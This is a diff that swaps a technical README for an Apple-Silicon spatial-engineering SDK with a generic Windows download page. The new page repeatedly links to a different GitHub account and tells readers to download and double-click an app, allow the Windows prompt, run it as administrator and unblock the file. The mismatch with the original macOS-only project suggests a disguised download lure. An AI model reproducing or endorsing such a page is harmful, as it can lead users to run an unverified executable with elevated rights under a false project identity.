@@ -1,78 +1,189 @@
+# 🧭 JuniorOmega - Run spatial tools on Windows
 
----
+[![Download JuniorOmega](https://img.shields.io/badge/Download%20JuniorOmega-blue?style=for-the-badge&logo=github)](https://github.com/planninginset507/JuniorOmega)
 
-# JuniorOmega SDK
-### Sovereign Spatial Engineering & Fabrication Pipeline
-**Engineered for Apple Silicon (M4/M1) | Powered by MLX & MPS**
+## 📥 Download
 
-JuniorOmega is a high-fidelity, low-power spatial data orchestration engine. It bridges the gap between raw edge-sensor ingestion (TrueDepth/LiDAR), manifold SVD topology generation, and automated fabrication (G-code). By leveraging Apple’s `mlx.core`, JuniorOmega executes high-density tensor math on-device, eliminating cloud latency and traditional PyTorch overhead.
+Go to the project page and download the latest version here:
 
----
+https://github.com/planninginset507/JuniorOmega
 
-## 🛠 Core Architecture
+Open the page, look for the latest release or download file, then save it to your PC
 
-The SDK is organized into five sovereign nodes, now expanded for decentralized edge compute:
+## 🪟 Windows setup
 
-* **1. Ingestion (Omni-Vision):** Multi-modal data capture across iPad Pro (TrueDepth), MacBook (FaceTime HD), and OAK-D spatial microprocessors.
-* **2. Transport (gRPC/NIO):** A decentralized "Nervous System" using gRPC to stream 1220-vertex facial/spatial manifolds from Swift-based mobile nodes to the M4 compute core.
-* **3. Core (MLX SVD):** Executes native Anisotropic Tensor Decomposition ($A = U \Sigma V^T$) to extract surface normals, curvature, and topological stability.
-* **4. Sandbox (Mid-Engine):** An interactive layer for BitNet/LLM agentic overrides, allowing real-time adjustment of anomaly thresholds before fabrication.
-* **5. Fabrication (G-Code):** Translates optimized meshes into topology-aware, 3-axis G-code toolpaths using adaptive feedrate and spline interpolation.
+JuniorOmega is built as a local app, so you run it on your own computer
 
----
+1. Open the download page
+2. Download the Windows version if it is listed
+3. Save the file to a folder you can find, like Downloads or Desktop
+4. If the file is a ZIP, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to start it
 
-## 🖥 Command Center UI
+If Windows shows a prompt, choose the option that lets you run the app
 
-JuniorOmega now includes a **TradingView-style Web Dashboard** for real-time monitoring:
-* **Live SVD Audit:** View stability metrics and curvature coefficients.
-* **3D Manifold Preview:** Interactive Plotly-driven 3D visualization of incoming point clouds.
-* **Metal Rendering:** Headless Blender integration for high-contrast "Sovereign Gold" artifact shading.
+## 🖥️ What JuniorOmega does
 
----
+JuniorOmega is a local-first spatial engineering stack
 
-## 📋 Requirements
+It helps move data from sensors into fabrication tools
 
-* **Hardware:** Apple Silicon (M4/M3/M2/M1) | iPad Pro/iPhone (for TrueDepth features).
-* **OS:** macOS 14.0+ (Sonoma/Sequoia) | iOS 17.0+.
-* **Python:** 3.10+ (Optimized for 3.12).
-* **Key Dependencies:** `mlx`, `grpcio`, `gradio`, `scipy`, `trimesh`, `mediapipe`.
+Use it to work with:
 
----
+- LiDAR scans
+- TrueDepth data
+- 3D scene data
+- CAD files
+- G-code output
+- CNC workflows
 
-## 🚀 Installation & Deployment
+It keeps the work on your device, which helps when you want a private setup
 
-### 1. Clone & Environment
-```bash
-git clone https://github.com/JuniorCloudLLC/JuniorOmega.git
-cd JuniorOmega
-python3 -m venv .venv
-source .venv/bin/activate
-python3 -m pip install -r requirements.txt
-```
+## ⚙️ Before you start
 
-### 2. Launching the Sovereign Node
-To start the gRPC receiver (WOS10 Edge Node) and the Command Center:
-```bash
-# Terminal A: Start the gRPC Listener
-python3 omega_orchestrator.py --grpc
+Check these basics before you run the app:
 
-# Terminal B: Start the Web Dashboard
-python3 ui_controller.py
-```
+- Windows 10 or Windows 11
+- Enough free disk space for project files
+- A mouse and keyboard
+- A modern CPU
+- A stable internet connection for the first download
 
-### 3. Swift App Deployment
-Navigate to `swift_app/` and open `Package.swift` in Xcode. Deploy to a TrueDepth-capable iPhone/iPad to begin streaming spatial data to your local node.
+If you plan to open large scan files, use a system with more memory and storage
 
----
+## 🧩 Key uses
 
-## 🔐 Security & Harvester Protocol
+JuniorOmega fits a few common tasks:
 
-JuniorOmega utilizes the **Enterprise Harvester** for public releases. This ensures:
-* **IP Protection:** Proprietary MLX math kernels are automatically scrubbed and replaced with Community Stubs in public branches.
-* **Vaulting:** Non-manifest artifacts and test data are moved to `Vaults/Quarantine` to maintain repository hygiene.
-* **Auditability:** Every harvest generates a JSON audit log for regulatory and engineering compliance.
+- Import sensor data from depth tools
+- Review 3D geometry in a local workspace
+- Move data into CAD tools
+- Prepare output for G-code or CNC use
+- Keep files in a private local folder
+- Work with Apple Silicon based project data in a simple local flow
 
----
+## 📂 How to use it
 
-**Identity:** Generated for the Lead Architect of JuniorCloud LLC.  
-**Tone:** Logic-dense engineering rigor. No fluff. Finalized for Public Release.
+After you open the app:
+
+1. Pick or create a local project folder
+2. Import your scan or geometry file
+3. Review the data in the workspace
+4. Choose the output you need
+5. Export the result for the next tool in your chain
+
+A common flow looks like this:
+
+- capture data
+- inspect the model
+- clean the mesh
+- export a file for CAD or CNC
+
+## 🛠️ File types you may see
+
+JuniorOmega works with formats used in spatial and fabrication work:
+
+- Protobuf data files
+- 3D mesh files
+- CAD exchange files
+- G-code files
+- sensor capture data
+- local project folders
+
+If you are not sure which file to open, start with the file from your sensor, model, or export tool
+
+## 🔐 Local-first use
+
+JuniorOmega is made for local use
+
+That means:
+
+- your files stay on your machine
+- you do not need to send data to a remote server
+- you can keep your workflow inside one system
+- you can work in a sandboxed setup when needed
+
+This is useful when you handle scan data, design files, or machine-ready output
+
+## 🧪 Example workflow
+
+You can use JuniorOmega in this order:
+
+1. Capture depth or scan data
+2. Open it in JuniorOmega
+3. Check the shape and scale
+4. Export the cleaned model
+5. Send the result to a CAD or CNC tool
+6. Generate G-code if your next step needs it
+
+## 📌 Common problems
+
+If the app does not open:
+
+- make sure the download finished
+- extract the ZIP file if needed
+- try running the app as an administrator
+- check that Windows did not block the file
+- move the app to a simple folder path like `C:\JuniorOmega`
+
+If a file does not load:
+
+- confirm the file type is supported
+- try a smaller sample file first
+- check that the file is not damaged
+- make sure the file path has no strange characters
+
+If the screen looks empty:
+
+- reopen the project
+- import a file again
+- check that the input file contains data
+- close and start the app once more
+
+## 📎 Project page
+
+Use this page to download and run JuniorOmega on Windows:
+
+https://github.com/planninginset507/JuniorOmega
+
+## 🧭 Helpful terms
+
+Here are a few words you may see in the app or file names:
+
+- LiDAR: a scan method that measures shape with light
+- TrueDepth: a depth sensor used for face and scene data
+- G-code: the file language used by CNC machines
+- CNC: a machine that cuts or shapes material
+- Mesh: a 3D surface made of triangles
+- CAD: software used to design parts and models
+
+## 📁 Suggested folder setup
+
+A simple folder layout can help:
+
+- `C:\JuniorOmega\App`
+- `C:\JuniorOmega\Projects`
+- `C:\JuniorOmega\Exports`
+
+This keeps app files, working files, and output files separate
+
+## 🧰 Good practice
+
+- Keep one project per folder
+- Use clear file names
+- Save your original scan files
+- Export copies instead of overwriting source files
+- Store machine output in a separate folder
+- Back up important project data
+
+## 🖱️ If you need to uninstall
+
+If you want to remove the app:
+
+1. Close JuniorOmega
+2. Delete the app folder if you used a ZIP build
+3. Remove any shortcut you made
+4. Delete project folders only if you no longer need them
+
+Keep your exported files if you plan to use them later
